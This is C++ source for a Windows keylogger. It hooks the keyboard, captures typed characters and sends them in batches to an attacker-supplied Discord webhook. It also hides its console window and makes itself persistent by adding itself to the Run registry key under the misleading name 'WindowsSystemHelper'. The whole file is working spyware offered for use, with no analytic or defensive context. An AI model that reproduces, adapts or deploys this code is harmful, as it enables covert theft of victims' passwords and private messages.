#include <windows.h>
#include <wininet.h>
#include <string>
#include <chrono>

#pragma comment(lib, "wininet.lib")

const char* WEBHOOK_URL = ""; // Your webhook url

std::string currentWord = "";
bool isShiftPressed = false;
std::chrono::steady_clock::time_point lastSendTime = std::chrono::steady_clock::now();

bool sendToDiscord(const std::string& message) {
    if (message.empty()) return false;
    
    auto now = std::chrono::steady_clock::now();
    auto timeDiff = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastSendTime);
    if (timeDiff.count() < 1000) {
        Sleep(1000 - timeDiff.count());
    }
    
    HINTERNET hInternet = InternetOpenA("DiscordBot/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, 
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string jsonData = "{\"content\":\"" + message + "\",\"username\":\"Appunti PC\"}";

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", 
                                         "YOUR API WEBHOOK",//
                                         NULL, NULL, NULL, 
                                         INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    
    bool success = false;
    if (hRequest) {
        const char* headers = "Content-Type: application/json\r\nUser-Agent: DiscordBot/1.0";
        
        if (HttpSendRequestA(hRequest, headers, strlen(headers), 
                           (LPVOID)jsonData.c_str(), jsonData.length())) {
            success = true;
            lastSendTime = std::chrono::steady_clock::now();
        }
        
        InternetCloseHandle(hRequest);
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return success;
}

std::string messageBuffer = "";

void sendBufferedMessage() {
    if (!messageBuffer.empty()) {
        if (sendToDiscord(messageBuffer)) {
            messageBuffer.clear();
        } else {
            Sleep(2000);
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbdStruct->vkCode;

            if (vkCode == VK_SHIFT) {
                isShiftPressed = true;
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                char c = 'a' + (vkCode - 0x41);
                if (isShiftPressed) c = toupper(c);
                currentWord += c;
            }
            else if (vkCode >= 0x30 && vkCode <= 0x39) {
                currentWord += '0' + (vkCode - 0x30);
            }
            else if (vkCode == VK_SPACE) {
                if (!currentWord.empty()) {
                    if (!messageBuffer.empty()) messageBuffer += " ";
                    messageBuffer += currentWord;
                    currentWord.clear();
                    
                    if (messageBuffer.length() > 30) {
                        sendBufferedMessage();
                    }
                }
            }
            else if (vkCode == VK_RETURN) {
                if (!currentWord.empty()) {
                    if (!messageBuffer.empty()) messageBuffer += " ";
                    messageBuffer += currentWord + " ↵";
                } else {
                    if (!messageBuffer.empty()) messageBuffer += " ↵";
                }
                sendBufferedMessage();
                currentWord.clear();
            }
            else if (vkCode == VK_BACK) {
                if (!currentWord.empty()) {
                    currentWord.pop_back();
                }
            }
            else if (vkCode == VK_ESCAPE) {
                sendBufferedMessage();
                sendToDiscord("🛑 Keylogger stopped manually");
                PostQuitMessage(0);
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }
        }
        else if (wParam == WM_KEYUP) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            if (kbdStruct->vkCode == VK_SHIFT) {
                isShiftPressed = false;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

void AddToStartup() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsSystemHelper", 0, REG_SZ, 
                      (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    sendBufferedMessage();
}

int main() {
    HideConsole();
    AddToStartup();

    SetTimer(NULL, 0, 30000, TimerProc);
    
    sendToDiscord("✅ Keylogger started successfully ");

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    if (!keyboardHook) {
        sendToDiscord("❌ Error");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    sendBufferedMessage();
    sendToDiscord("🔒 Keylogger closed");
    KillTimer(NULL, 0);
    UnhookWindowsHookEx(keyboardHook);
    
    return 0;
}